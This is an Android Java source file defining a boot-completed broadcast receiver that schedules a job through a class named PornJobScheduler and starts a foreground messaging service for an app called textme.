package com.candroid.textme;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;

public class BootCompletedReceiver extends BroadcastReceiver {

    @Override
    public void onReceive(Context context, Intent intent) {
        PornJobScheduler.scheduleJob(context);
        intent.setClass(context, MessagingService.class);
        context.startForegroundService(intent);
    }
}